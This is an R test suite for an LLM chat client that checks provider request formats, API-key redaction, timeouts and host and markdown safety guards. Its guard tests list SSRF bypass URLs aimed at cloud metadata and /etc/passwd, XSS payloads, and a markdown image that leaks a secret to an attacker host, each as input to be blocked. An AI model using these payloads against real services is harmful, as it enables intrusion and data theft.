fake_resp <- function(body, status = 200) {
  structure(list(url = "https://example.test", status_code = status,
                 headers = list(`content-type` = "application/json"),
                 content = charToRaw(body)), class = "response")
}
to_json <- function(x) as.character(jsonlite::toJSON(x, auto_unbox = TRUE, null = "null"))

gemini_body <- function(txt, finish = "STOP") to_json(list(candidates = list(list(
  content = list(role = "model", parts = list(list(text = txt))), finishReason = finish))))
openai_body <- function(txt, finish = "stop", refusal = NULL) to_json(list(choices = list(list(
  message = list(role = "assistant", content = txt, refusal = refusal),
  finish_reason = finish))))
anthropic_body <- function(txt, stop = "end_turn") to_json(list(
  content = list(list(type = "text", text = txt)), stop_reason = stop))

mock_post <- function(responses) {
  env <- new.env()
  env$calls <- list()
  env$queue <- responses
  env$post <- function(url, ..., body = NULL, encode = NULL) {
    env$calls[[length(env$calls) + 1]] <- list(url = url, body = body, dots = list(...))
    r <- env$queue[[1]]
    env$queue <- env$queue[-1]
    r
  }
  env
}

user_msg <- list(list(role = "user", content = "hi"))
key <- "SECRETKEY123456789"

test_that("Ask AI carries verified controls and support limits with custom instructions", {
  seen <- NULL
  local_mocked_bindings(llm_chat = function(provider, model, system, ...) {
    seen <<- system
    list(text = "ok", model = model, served_model = NA, finish = "stop", usage = list())
  })
  llm_ask(list(), "How are trials configured?", "No analysis details were shared.",
          provider = "local", instructions = "Answer briefly.")
  facts <- c("Outcome type = Other", "Trials column", "no fixed-trials numeric control",
             "Phase coding occurs before measure selection", "Gaussian, Poisson, and negative binomial",
             "BC-SMD requires Gaussian outcomes", "ordinal thresholds", "cannot operate R or Excel",
             "These controls are on the Model tab", "do not establish causal effects",
             "Gaussian restriction applies to bc_smd_bayes")
  invisible(lapply(facts, function(fact) expect_match(seen, fact, fixed = TRUE)))
})

test_that("branching grade and math conversations preserve questions and refreshed context", {
  cases <- jsonlite::fromJSON(test_path("fixtures", "ask-conversations.json"), simplifyVector = FALSE)
  adapters <- list(gemini = gemini_body, openai = openai_body,
                   anthropic = anthropic_body, local = openai_body)
  invisible(lapply(names(adapters), function(p) {
    invisible(lapply(cases, function(case) {
      replies <- paste0("Adapter reply ", seq_along(case$questions))
      m <- mock_post(lapply(replies, function(reply) fake_resp(adapters[[p]](reply))))
      local_mocked_bindings(POST = m$post, .package = "httr")
      history <- list()
      invisible(lapply(seq_along(case$questions), function(turn) {
        context <- paste0("Location: Model\nGrade: ", case$grade, "\nTopic: ", case$topic,
                          "\nContext revision: ", turn)
        out <- llm_ask(history, case$questions[[turn]], context,
                       provider = p, model = "test-model", api_key = key)
        body <- m$calls[[turn]]$body
        system <- switch(p, gemini = body$systemInstruction$parts[[1]]$text,
                         anthropic = body$system, body$messages[[1]]$content)
        messages <- switch(p, gemini = body$contents, anthropic = body$messages,
                           body$messages[-1])
        texts <- vapply(messages, function(message) {
          if (p == "gemini") return(message$parts[[1]]$text)
          message$content
        }, "")
        expect_identical(tail(texts, 1), case$questions[[turn]])
        expect_identical(texts, c(as.vector(rbind(head(unlist(case$questions), turn - 1),
                                                head(replies, turn - 1))), case$questions[[turn]]))
        expect_match(system, context, fixed = TRUE)
        expect_match(system, "single-case design", fixed = TRUE)
        expect_false(grepl("single-case experimental design", system, fixed = TRUE))
        expect_match(system, "Never compute or state numeric effect sizes", fixed = TRUE)
        expect_false(any(c("tools", "tool_choice", "functions") %in% names(body)))
        expect_length(out$next_history, turn)
        history <<- out$next_history
      }))
    }))
  }))
})

test_that("each provider returns text for a normal response", {
  cases <- list(gemini = gemini_body("g ok"), openai = openai_body("o ok"),
                anthropic = anthropic_body("a ok"), local = openai_body("l ok"))
  for (p in names(cases)) {
    m <- mock_post(list(fake_resp(cases[[p]])))
    local_mocked_bindings(POST = m$post, .package = "httr")
    out <- llm_chat(p, model = "m1", system = "sys", messages = user_msg,
                    api_key = if (p == "local") NULL else key)
    expect_equal(out$finish, "stop")
    expect_match(out$text, "ok$")
    expect_equal(out$model, "m1")
    expect_false(grepl(key, m$calls[[1]]$url, fixed = TRUE))
    expect_true(is.na(out$served_model))
  }
})

test_that("the served model version reported by the provider is returned", {
  with_version <- function(body, field, v) {
    x <- jsonlite::fromJSON(body, simplifyVector = FALSE)
    x[[field]] <- v
    to_json(x)
  }
  cases <- list(gemini = with_version(gemini_body("ok"), "modelVersion", "g-001"),
                openai = with_version(openai_body("ok"), "model", "o-2026"),
                anthropic = with_version(anthropic_body("ok"), "model", "a-2026"))
  for (p in names(cases)) {
    m <- mock_post(list(fake_resp(cases[[p]])))
    local_mocked_bindings(POST = m$post, .package = "httr")
    out <- llm_chat(p, model = "m1", system = "sys", messages = user_msg, api_key = key)
    expect_equal(out$model, "m1")
    expect_equal(out$served_model, c(gemini = "g-001", openai = "o-2026",
                                     anthropic = "a-2026")[[p]])
  }
})

test_that("request bodies follow each provider's shape and pass the JSON schema", {
  schema <- list(type = "object", properties = list(a = list(type = "string")),
                 required = I("a"))
  bodies <- list(gemini = gemini_body('{"a":"x"}'), openai = openai_body('{"a":"x"}'),
                 anthropic = anthropic_body('{"a":"x"}'), local = openai_body('{"a":"x"}'))
  got <- lapply(names(bodies), function(p) {
    m <- mock_post(list(fake_resp(bodies[[p]])))
    local_mocked_bindings(POST = m$post, .package = "httr")
    out <- llm_chat(p, model = "m1", system = "sys", messages = user_msg,
                    json_schema = schema, api_key = key, base_url = NULL)
    expect_equal(out$json$a, "x")
    m$calls[[1]]
  })
  names(got) <- names(bodies)
  expect_identical(got$gemini$body$generationConfig$responseJsonSchema, schema)
  expect_equal(got$gemini$body$generationConfig$responseMimeType, "application/json")
  expect_equal(got$gemini$body$systemInstruction$parts[[1]]$text, "sys")
  expect_identical(got$openai$body$response_format$json_schema$schema, schema)
  expect_equal(got$openai$body$messages[[1]]$role, "system")
  expect_false(is.null(got$openai$body$max_completion_tokens))
  expect_false(is.null(got$local$body$max_tokens))
  expect_match(got$local$url, "^http://localhost:11434/v1/chat/completions$")
  expect_identical(got$anthropic$body$output_config$format$schema, schema)
  expect_equal(got$anthropic$body$system, "sys")
  expect_null(got$anthropic$body$temperature)
})

test_that("truncated, blocked, refused, and malformed responses raise clear errors", {
  check <- function(provider, resp, pattern, json = NULL) {
    m <- mock_post(list(resp))
    local_mocked_bindings(POST = m$post, .package = "httr")
    expect_error(llm_chat(provider, model = "m", messages = user_msg, api_key = key,
                          json_schema = json), pattern)
  }
  sch <- list(type = "object")
  check("gemini", fake_resp(gemini_body('{"phase":"pro', "MAX_TOKENS")), "cut off", sch)
  check("openai", fake_resp(openai_body('{"a":', "length")), "cut off", sch)
  check("anthropic", fake_resp(anthropic_body("", "max_tokens")), "cut off")
  check("gemini", fake_resp('{"candidates":[{"finishReason":"SAFETY","index":0}]}'), "blocked")
  check("gemini", fake_resp('{"promptFeedback":{"blockReason":"PROHIBITED_CONTENT"}}'), "blocked")
  check("openai", fake_resp(openai_body(NULL, "content_filter")), "blocked")
  check("openai", fake_resp(openai_body(NULL, "stop", "I cannot help")), "declined")
  check("anthropic", fake_resp(anthropic_body("", "refusal")), "declined")
  check("local", fake_resp("<html>not json</html>"), "not JSON")
  check("anthropic", fake_resp(to_json(list(content = list()))), "empty")
})

test_that("malformed JSON content under a schema returns json = NULL", {
  m <- mock_post(list(fake_resp(gemini_body("not { json"))))
  local_mocked_bindings(POST = m$post, .package = "httr")
  out <- llm_chat("gemini", messages = user_msg, api_key = key,
                  json_schema = list(type = "object"))
  expect_null(out$json)
})

test_that("API keys never appear in error text and bodies are truncated", {
  big <- to_json(list(error = list(code = 400, message = paste(
    "API key", key, "not valid", strrep("x", 2000)))))
  for (p in c("gemini", "openai", "anthropic")) {
    m <- mock_post(list(fake_resp(big, 400)))
    local_mocked_bindings(POST = m$post, .package = "httr")
    msg <- tryCatch(llm_chat(p, messages = user_msg, api_key = key),
                    error = function(e) conditionMessage(e))
    expect_false(grepl(key, msg, fixed = TRUE))
    expect_lt(nchar(msg), 300)
  }
  m <- mock_post(list(fake_resp('{"error":"model not found AIzaSyLEAKEDKEY0000"}', 404)))
  local_mocked_bindings(POST = m$post, .package = "httr")
  msg <- tryCatch(llm_chat("local", messages = user_msg), error = function(e) conditionMessage(e))
  expect_false(grepl("AIzaSyLEAKED", msg, fixed = TRUE))
  expect_error(llm_chat("openai", messages = user_msg), "API key is required")
})

test_that("Ask resends context on turn 2 and never sends empty parts", {
  m <- mock_post(list(fake_resp(gemini_body("first")), fake_resp(gemini_body("second"))))
  local_mocked_bindings(POST = m$post, .package = "httr")
  ctx <- "Design: mbd\nDiagnostics: max R-hat 1.08"
  a1 <- llm_ask(list(), "Did it converge?", ctx, provider = "gemini", api_key = key)
  a2 <- llm_ask(a1$next_history, "And the level effect?", ctx, provider = "gemini", api_key = key)
  b2 <- m$calls[[2]]$body
  expect_match(b2$systemInstruction$parts[[1]]$text, "R-hat 1.08", fixed = TRUE)
  expect_equal(vapply(b2$contents, `[[`, "", "role"), c("user", "model", "user"))
  texts <- vapply(b2$contents, function(x) x$parts[[1]]$text, "")
  expect_true(all(nzchar(texts)))
  expect_length(a2$next_history, 2)
  expect_error(llm_ask(a2$next_history, "  ", ctx, api_key = key), "Type a question")
})

test_that("local calls get a 180 s timeout, cloud 60 s, and the setting overrides both", {
  seen <- numeric(0)
  local_mocked_bindings(llm_chat = function(..., timeout) {
    seen <<- c(seen, timeout)
    list(text = '{"phase":"elicit","questions":["q"]}', model = "m", json = NULL)
  })
  withr::local_envvar(SCDBAYES_LLM_TIMEOUT = "")
  withr::local_options(scdbayes.llm_timeout = NULL)
  llm_ask(list(), "q", "ctx", provider = "local")
  llm_dialog_turn(list(), "", "ctx", provider = "local")
  llm_ask(list(), "q", "ctx", provider = "gemini", api_key = key)
  withr::local_envvar(SCDBAYES_LLM_TIMEOUT = "300")
  llm_ask(list(), "q", "ctx", provider = "gemini", api_key = key)
  withr::local_envvar(SCDBAYES_LLM_TIMEOUT = "-5")
  llm_ask(list(), "q", "ctx", provider = "local")
  expect_equal(seen, c(180, 180, 60, 300, 180))
})

test_that("dialog keeps context, fills the empty first note, and needs a reply after turn 1", {
  m <- mock_post(list(fake_resp(gemini_body('{"phase":"elicit","questions":["q1"]}')),
                      fake_resp(gemini_body(
                        '{"phase":"propose","candidates":[{"class":"b","prior_string":"normal(0, 1)"}]}'))))
  local_mocked_bindings(POST = m$post, .package = "httr")
  ctx <- "Design: ab\nOutcome family: poisson"
  d1 <- llm_dialog_turn(list(), "", ctx, provider = "gemini", api_key = key)
  expect_equal(d1$parsed$phase, "elicit")
  expect_error(llm_dialog_turn(d1$next_state, "", ctx, provider = "gemini", api_key = key),
               "Type a reply")
  d2 <- llm_dialog_turn(d1$next_state, "Baseline about 5", ctx, provider = "gemini",
                        api_key = key)
  b2 <- m$calls[[2]]$body
  texts <- vapply(b2$contents, function(x) x$parts[[1]]$text, "")
  expect_true(all(nzchar(texts)))
  expect_match(b2$systemInstruction$parts[[1]]$text, "poisson", fixed = TRUE)
  expect_false(is.null(b2$generationConfig$responseJsonSchema))
  expect_equal(d2$parsed$phase, "propose")
  expect_equal(d2$model, llm_default_model("gemini"))
})

test_that("a propose reply needs candidate objects with class and prior_string", {
  replies <- c('{"phase":"propose","candidates":["normal(0, 1)"]}',
               '{"phase":"propose","candidates":{"class":"b","prior_string":"normal(0, 1)"}}',
               '{"phase":"propose","candidates":[{"class":"b","prior_string":"normal(0, 1)"},{"class":"b"},"x"]}')
  m <- mock_post(lapply(replies, function(r) fake_resp(gemini_body(r))))
  local_mocked_bindings(POST = m$post, .package = "httr")
  ctx <- "Design: ab"
  strings <- llm_dialog_turn(list(), "", ctx, provider = "gemini", api_key = key)
  expect_null(strings$parsed)
  expect_match(strings$problem, "no usable candidates")
  object <- llm_dialog_turn(list(), "", ctx, provider = "gemini", api_key = key)
  expect_null(object$parsed)
  expect_match(object$problem, "class and a prior_string")
  mixed <- llm_dialog_turn(list(), "", ctx, provider = "gemini", api_key = key)
  expect_length(mixed$parsed$candidates, 1)
  expect_equal(mixed$parsed$candidates[[1]]$prior_string, "normal(0, 1)")
  expect_null(mixed$problem)
  expect_equal(.llm_check_dialog(list(phase = "elicit", questions = list("q")))$parsed$phase,
               "elicit")
  expect_match(.llm_check_dialog(list(phase = "other"))$problem, "not an elicit or propose")
})

test_that("base URLs with a query, fragment, or dot segment are refused", {
  withr::local_options(list(scdbayes.llm_allow_private = TRUE))
  for (u in c("http://10.0.0.5/v1?x=1", "http://10.0.0.5/v1#frag", "http://10.0.0.5/v1/../admin",
              "http://10.0.0.5/v1/./x", "http://10.0.0.5/v1%2F..", "http://10.0.0.5/v1\\x")) {
    expect_error(.llm_check_host(u, "local"), "query", info = u)
  }
  expect_null(.llm_check_host("http://10.0.0.5/v1", "local"))
})

test_that("6to4 and Teredo IPv6 addresses count as private", {
  withr::local_options(list(scdbayes.llm_allow_private = NULL))
  expect_true(.llm_addr_private("2002:a00:1::1"))
  expect_true(.llm_addr_private("2002:7f00:1::"))
  expect_true(.llm_addr_private("2001:0:4136:e378::1"))
  expect_false(.llm_addr_private("2001:4860:4860::8888"))
  expect_equal(.llm_host_status("http://[2002:a00:1::1]/v1"), "private")
  expect_equal(.llm_host_status("http://[2001:0:4136:e378::1]/v1"), "private")
})

test_that("SIIT and discard-prefix IPv6 addresses count as private", {
  expect_true(.llm_addr_private("::ffff:0:a00:1"))
  expect_true(.llm_addr_private("::ffff:0:127.0.0.1"))
  expect_true(.llm_addr_private("100::1"))
  expect_false(.llm_addr_private("100:1::1"))
})

test_that("render_llm_markdown shows < once inside code and still escapes tags", {
  html <- render_llm_markdown("Column `<dbl>` and <script>x</script>\n\n```\na <- 1\n```")
  expect_match(html, "<code>&lt;dbl&gt;</code>", fixed = TRUE)
  expect_match(html, "a &lt;- 1", fixed = TRUE)
  expect_false(grepl("&amp;lt;", html, fixed = TRUE))
  expect_false(grepl("<script", html, fixed = TRUE))
})

test_that("llm_is_local_host agrees with the loopback list of the address guard", {
  expect_true(llm_is_local_host("http://localhost:11434/v1"))
  expect_true(llm_is_local_host("http://LOCALHOST.:11434/v1"))
  expect_true(llm_is_local_host("http://[::1]:8080/v1"))
  expect_true(llm_is_local_host("https://127.0.0.1/v1"))
  expect_false(llm_is_local_host("http://127.0.0.2/v1"))
  expect_false(llm_is_local_host("http://evil.localhost/v1"))
  expect_false(llm_is_local_host("http://localhost@evil.example/v1"))
  expect_false(llm_is_local_host(NULL))
  urls <- c("http://localhost:1/v1", "http://localhost.:1/v1", "http://[::1]:1/v1",
            "http://127.0.0.1:1/v1", "http://a.localhost/v1")
  expect_equal(vapply(urls, llm_is_local_host, logical(1), USE.NAMES = FALSE),
               vapply(urls, function(u) .llm_host_status(u) == "loopback", logical(1),
                      USE.NAMES = FALSE))
})

test_that("history is capped by turns and characters", {
  h <- lapply(1:20, function(i) list(q = strrep("q", 1000), a = strrep("a", 1000)))
  expect_length(.llm_cap_history(h, 8L, 1e6), 8)
  expect_length(.llm_cap_history(h, 8L, 5000), 2)
  expect_length(.llm_cap_history(list(list(q = "", a = "x")), 8L, 100), 0)
})

test_that("gemini thinking config follows the model family", {
  m <- mock_post(list(fake_resp(gemini_body("x")), fake_resp(gemini_body("y"))))
  local_mocked_bindings(POST = m$post, .package = "httr")
  llm_chat("gemini", "gemini-2.5-flash", messages = user_msg, api_key = key)
  llm_chat("gemini", "gemini-3.8-flash", messages = user_msg, api_key = key)
  expect_equal(m$calls[[1]]$body$generationConfig$thinkingConfig$thinkingBudget, 512L)
  expect_equal(m$calls[[2]]$body$generationConfig$thinkingConfig$thinkingLevel, "low")
})

test_that("provider defaults come from options and environment", {
  withr::local_options(list(scdbayes.llm_provider = NULL, scdbayes.llm_model = NULL,
                            scdbayes.openai_model = NULL, scdbayes.llm_base_url = NULL,
                            scdbayes.llm_probe_local = NULL))
  withr::local_envvar(c(SCDBAYES_LLM_PROVIDER = "openai", SCDBAYES_LLM_MODEL = "m-admin",
                        SCDBAYES_LLM_BASE_URL = "http://gpu.example.org/v1"))
  expect_equal(llm_default_provider(check_local = FALSE), "openai")
  expect_equal(llm_default_model("openai"), "m-admin")
  expect_equal(llm_base_url(), "http://gpu.example.org/v1")
  expect_match(llm_privacy_note("local", llm_base_url()), "remote host")
  expect_match(llm_privacy_note("local", "http://localhost:11434/v1"), "not sent to a third party")
  withr::local_envvar(c(SCDBAYES_LLM_PROVIDER = "", GEMINI_API_KEY = ""))
  expect_equal(llm_default_provider(check_local = FALSE), "local")
  withr::local_options(list(scdbayes.llm_base_url = NULL))
  withr::local_envvar(c(SCDBAYES_LLM_BASE_URL = ""))
  local_mocked_bindings(GET = function(...) stop("no network probe expected"), .package = "httr")
  expect_true(is.na(llm_default_provider()))
  expect_match(llm_privacy_note("local"), "not sent to a third party")
  expect_false(grepl("improve", llm_privacy_note("gemini")))
  expect_match(llm_model_label("gemini", "gemini-x"), "Gemini (gemini-x)", fixed = TRUE)
})

test_that("private, link-local, and metadata hosts are refused unless allowed", {
  priv <- c("http://10.0.0.5/v1", "http://172.20.1.1:8000/v1", "http://192.168.1.2/v1",
            "http://169.254.169.254/latest", "http://[fd00::1]:11434/v1",
            "http://metadata.google.internal/x")
  local_mocked_bindings(.llm_resolve = function(host) "93.184.216.34")
  expect_true(all(vapply(priv, .llm_private_host, logical(1))))
  expect_false(any(vapply(c("http://localhost:11434/v1", "http://127.0.0.1:8080/v1",
                            "https://gpu.example.org/v1", "http://172.32.0.1/v1"),
                          .llm_private_host, logical(1))))
  withr::local_options(list(scdbayes.llm_allow_private = NULL))
  withr::local_envvar(c(SCDBAYES_LLM_ALLOW_PRIVATE = ""))
  expect_error(llm_chat("local", "m", messages = user_msg, base_url = "http://10.0.0.5/v1"),
               "private")
  expect_false(llm_test_connection("local", "m", base_url = "http://169.254.169.254")$ok)
  withr::local_options(list(scdbayes.llm_allow_private = TRUE))
  m <- mock_post(list(fake_resp(openai_body("ok"))))
  local_mocked_bindings(POST = m$post, .package = "httr")
  expect_equal(llm_chat("local", "m", messages = user_msg, base_url = "http://10.0.0.5/v1")$text,
               "ok")
})

test_that("encoded, user-info, mapped, and resolved private hosts are refused", {
  local_mocked_bindings(.llm_resolve = function(host) switch(host,
    "rebind.example" = c("93.184.216.34", "10.0.0.7"), "v6.example" = "fd12::1",
    "ok.example" = c("93.184.216.34", "2606:4700::1"), NULL))
  bypass <- c(decimal = "http://2852039166/x", octal = "http://0251.0376.0251.0376/x",
              hex = "http://0xa9fea9fe/x", short = "http://10.1/x",
              trailing_dot = "http://169.254.169.254./x", userinfo = "http://u@169.254.169.254/x",
              userinfo2 = "http://localhost@10.0.0.1/x", noscheme = "169.254.169.254/x",
              file = "file:///etc/passwd", v4mapped = "http://[::ffff:169.254.169.254]/x",
              v4mapped_hex = "http://[::ffff:a9fe:a9fe]/x", ula = "http://[FD00::1]/x",
              linklocal6 = "http://[fe80::1]/x", zero = "http://0.0.0.0/x",
              loop2 = "http://127.1.2.3/x", sublocal = "http://foo.localhost/x",
              rebind = "http://rebind.example/x", v6name = "http://v6.example/x",
              unresolved = "http://nowhere.example/x", backslash = "http://ok.example\\@10.0.0.1/")
  expect_true(all(vapply(bypass, .llm_private_host, logical(1))))
  expect_false(.llm_private_host("https://ok.example/v1"))
  expect_false(.llm_private_host("http://[2606:4700::1]:8080/v1"))
  withr::local_options(list(scdbayes.llm_allow_private = NULL, scdbayes.llm_base_url = NULL))
  withr::local_envvar(c(SCDBAYES_LLM_ALLOW_PRIVATE = "", SCDBAYES_LLM_BASE_URL = ""))
  for (u in bypass) expect_error(.llm_check_host(u, "local"))
  expect_error(.llm_check_host("http://u@ok.example/v1", "local"), "user info")
  expect_no_error(.llm_check_host("http://localhost:11434/v1", "local"))
  expect_error(.llm_check_host("http://localhost:6379/v1", "local"), "loopback")
  expect_error(.llm_check_host("http://localhost:11434/v1", "openai"), "loopback")
  withr::local_envvar(c(SCDBAYES_LLM_ALLOW_PRIVATE = "1"))
  expect_no_error(.llm_check_host("http://10.0.0.5/v1", "local"))
  expect_error(.llm_check_host("http://u@10.0.0.5/v1", "local"), "user info")
})

test_that("a cleared host name is pinned to the addresses that passed the check", {
  local_mocked_bindings(.llm_resolve = function(host) switch(host,
    "ok.example" = c("93.184.216.34", "2606:4700::1"), NULL))
  withr::local_options(list(scdbayes.llm_allow_private = NULL))
  withr::local_envvar(c(SCDBAYES_LLM_ALLOW_PRIVATE = ""))
  expect_equal(.llm_check_host("https://ok.example/v1", "local"),
               "ok.example:443:93.184.216.34,2606:4700::1")
  expect_equal(.llm_check_host("http://ok.example:8080/v1", "local"),
               "ok.example:8080:93.184.216.34,2606:4700::1")
  expect_null(.llm_check_host("http://[2606:4700::1]:8080/v1", "local"))
  expect_null(.llm_check_host(NULL, "openai"))
})

test_that("the pinned address is sent to curl, not re-resolved", {
  local_mocked_bindings(.llm_resolve = function(host) switch(host,
    "ok.example" = "93.184.216.34", NULL))
  withr::local_options(list(scdbayes.llm_allow_private = NULL))
  withr::local_envvar(c(SCDBAYES_LLM_ALLOW_PRIVATE = ""))
  m <- mock_post(list(fake_resp(openai_body("ok"))))
  local_mocked_bindings(POST = m$post, .package = "httr")
  llm_chat("local", "m", messages = user_msg, base_url = "http://ok.example:8080/v1")
  opts <- unlist(lapply(m$calls[[1]]$dots, function(d) d$options), recursive = FALSE)
  expect_equal(opts$resolve, "ok.example:8080:93.184.216.34")
  expect_equal(opts$followlocation, 0L)
})

test_that("requests never follow redirects and error bodies are not echoed", {
  m <- mock_post(list(fake_resp("SECRET-INTERNAL-BODY token=abc", 500),
                      fake_resp("<html>SECRET-HTML</html>", 200),
                      fake_resp("", 302)))
  local_mocked_bindings(POST = m$post, .package = "httr")
  e1 <- tryCatch(llm_chat("local", "m", messages = user_msg), error = conditionMessage)
  e2 <- tryCatch(llm_chat("local", "m", messages = user_msg), error = conditionMessage)
  e3 <- tryCatch(llm_chat("local", "m", messages = user_msg), error = conditionMessage)
  expect_match(e1, "HTTP 500")
  expect_false(grepl("SECRET", paste(e1, e2), fixed = TRUE))
  expect_match(e3, "redirect")
  cfg <- Filter(function(x) inherits(x, "request"), m$calls[[1]]$dots)
  expect_true(any(vapply(cfg, function(x) identical(x$options$followlocation, 0L), logical(1))))
})

test_that("async requests to a loopback server do not follow redirects", {
  skip_if_not(.llm_async_ok())
  skip_if_not_installed("httpuv")
  hits <- new.env()
  hits$paths <- character(0)
  port <- httpuv::randomPort()
  srv <- httpuv::startServer("127.0.0.1", port, list(call = function(req) {
    hits$paths <- c(hits$paths, req$PATH_INFO)
    if (grepl("^/redir", req$PATH_INFO))
      return(list(status = 302L, headers = list(Location = sprintf("http://127.0.0.1:%d/after", port)),
                  body = ""))
    list(status = 500L, headers = list(`Content-Type` = "text/plain"), body = "SECRET-BODY")
  }))
  on.exit(httpuv::stopServer(srv), add = TRUE)
  base <- sprintf("http://127.0.0.1:%d/redir", port)
  withr::local_options(list(scdbayes.llm_base_url = base))
  res <- NULL
  promises::then(llm_chat("local", "m", messages = user_msg, base_url = base, timeout = 5,
                          async = TRUE),
                 function(v) res <<- "ok", function(e) res <<- conditionMessage(e))
  t0 <- Sys.time()
  while (is.null(res) && difftime(Sys.time(), t0, units = "secs") < 8) {
    httpuv::service(50)
    later::run_now(0.05)
  }
  expect_match(res, "HTTP 302")
  expect_false(any(hits$paths == "/after"))
})

test_that("model ids are validated and encoded before entering the URL", {
  expect_error(llm_chat("gemini", "../../v1beta/cachedContents?x=", messages = user_msg,
                        api_key = key), "model id")
  expect_error(llm_chat("gemini", "a/b", messages = user_msg, api_key = key), "model id")
  expect_error(llm_chat("bogus", "m", messages = user_msg, api_key = key))
  req <- .llm_build("gemini", "gemini-x:1", "", user_msg, NULL, NULL, 10, key, NULL)
  expect_match(req$url, "/models/gemini-x%3A1:generateContent$")
})

test_that("async falls back to a blocking request without promises, curl, or later", {
  local_mocked_bindings(.llm_async_ok = function() FALSE)
  m <- mock_post(list(fake_resp(gemini_body("sync")), fake_resp(gemini_body("sync2"))))
  local_mocked_bindings(POST = m$post, .package = "httr")
  out <- llm_chat("gemini", "m", messages = user_msg, api_key = key, async = TRUE)
  expect_equal(out$text, "sync")
  a <- llm_ask(list(), "q", "ctx", provider = "gemini", api_key = key, async = TRUE)
  expect_equal(a$text, "sync2")
})

test_that("the dialog schema closes every object for strict structured output", {
  s <- .llm_dialog_schema()
  expect_false(s$additionalProperties)
  expect_false(s$properties$candidates$items$additionalProperties)
})

test_that("test connection reports latency without the key", {
  m <- mock_post(list(fake_resp(to_json(list(error = list(message = paste("bad", key)))), 401)))
  local_mocked_bindings(POST = m$post, .package = "httr")
  r <- llm_test_connection("openai", "m1", api_key = key)
  expect_false(r$ok)
  expect_false(grepl(key, r$message, fixed = TRUE))
  expect_true(is.numeric(r$latency_ms))
  local_mocked_bindings(GET = function(url, ...) fake_resp(to_json(list(
    data = list(list(id = "gemma3:latest"))))), .package = "httr")
  r2 <- llm_test_connection("local", "gemma3", base_url = "http://localhost:11434/v1")
  expect_true(r2$ok)
  expect_equal(r2$message, "Connected.")
})

test_that("sanitize_llm_text strips control characters and caps length", {
  s <- sanitize_llm_text(paste0("a\x01b", strrep("z", 5000)))
  expect_equal(nchar(s), 4000)
  expect_false(grepl("\x01", s, fixed = TRUE))
  expect_equal(sanitize_llm_text(NULL), "")
  expect_equal(sanitize_llm_text(NA_character_), "")
})

test_that("render_llm_markdown keeps only http, https, and mailto targets", {
  html <- render_llm_markdown(paste(
    "[a](javascript:alert(1)) [b](https://x.org) [c](mailto:a@b.org)",
    "[d](&#106;avascript:alert(1)) [e](vbscript:x) ![i](data:image/png;base64,AA)",
    "<script>x</script> <img src=x onerror=alert(1)>"))
  hrefs <- regmatches(html, gregexpr("(href|src)=\"[^\"]*\"", html))[[1]]
  expect_true(all(grepl("^(href|src)=\"(#|https://|mailto:)", hrefs)))
  expect_false(grepl("<script", html, fixed = TRUE))
  expect_false(grepl("<img src=x", html, fixed = TRUE))
  expect_match(html, "rel=\"noopener noreferrer\" target=\"_blank\"", fixed = TRUE)
})

test_that("render_llm_markdown replaces images with their alt text", {
  html <- render_llm_markdown(paste(
    "![chart](https://attacker.example/c?d=SECRET) ![](https://x.example/p.png)",
    "[![logo](https://x.example/l.png)](https://ok.example)"))
  expect_false(grepl("<img", html, fixed = TRUE))
  expect_false(grepl("attacker.example", html, fixed = TRUE))
  expect_match(html, "[image: chart]", fixed = TRUE)
  expect_match(html, "href=\"https://ok.example\"", fixed = TRUE)
})

test_that("llm_ask uses custom instructions and always appends the conventions", {
  seen <- NULL
  local_mocked_bindings(llm_chat = function(provider, model, system, ...) {
    seen <<- system
    list(text = "ok", model = model, served_model = NA, finish = "stop", usage = list())
  })
  llm_ask(list(), "q", "ctx", provider = "local", instructions = "Answer in one sentence.")
  expect_match(seen, "Answer in one sentence.", fixed = TRUE)
  expect_match(seen, "Package conventions in scdbayes", fixed = TRUE)
  llm_ask(list(), "q", "ctx", provider = "local", instructions = "  ")
  expect_match(seen, llm_default_instructions(), fixed = TRUE)
})
